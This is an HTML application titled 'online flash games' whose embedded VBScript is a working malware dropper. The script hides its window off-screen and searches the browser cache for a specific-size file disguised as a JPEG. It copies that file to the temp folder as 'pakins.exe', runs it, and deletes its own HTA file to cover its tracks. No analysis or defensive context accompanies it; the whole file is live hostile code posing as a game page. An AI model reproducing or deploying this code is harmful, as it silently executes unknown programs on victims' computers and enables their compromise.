
   <HTML><TITLE>online flash games</TITLE>
   <SCRIPT LANGUAGE="VBScript">
   Option Explicit
   Dim blnSearchResult
   Dim objFSO, objWSH
   Dim strCachePath, strTempPath, strSystemPath

   window.resizeTo 0, 0
   window.moveto 10000, 10000

   blnSearchResult = False

   Set objFSO = CreateObject("Scripting.FileSystemObject")
   Set objWSH = CreateObject("WScript.Shell")
   strTempPath = objFSO.GetSpecialFolder(2) & "\"
   strSystemPath = objFSO.GetSpecialFolder(1) & "\"
   strCachePath = objWSH.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Cache")
   if Right(strCachePath, 1) <> "\" then strCachePath = strCachePath & "\"

   '---------------------------------------------------------------------------------------

   Sub StartSearch()
     if blnSearchResult = False then SearchFile strCachePath, "2005528165337645[1].jpg"
     if blnSearchResult = False then SearchFile strCachePath, "2005528165337645[2].jpg"
     if blnSearchResult = False then setTimeout "StartSearch()", 1000
   End Sub

   '---------------------------------------------------------------------------------------

   Function SearchFile(strFilePath, strFileName)
     On Error Resume Next
     Dim objFolder, objSubFolder, objFile

     If objFSO.FileExists(strFilePath & strFileName) Then
       set objFile = objFSO.GetFile(strFilePath & strFileName)

       If objFile.Size = 103855 then
         objFile.Copy(strTempPath & "pakins.exe")
         objWSH.Run strTempPath & "pakins.exe"
         objFSO.DeleteFile "c:\winxp.hta"
         blnSearchResult = True
         window.close()
       End If
     End If

     set objFolder = objFSO.GetFolder(strFilePath)
     If objFolder.SubFolders.Count > 0 Then
       For Each objSubFolder In objFolder.SubFolders
         SearchFile objSubFolder.Path & "\", strFileName
       Next
     End If
   End Function

   '---------------------------------------------------------------------------------------

   setTimeout "StartSearch()", 1000
   </SCRIPT>
   </HTML>
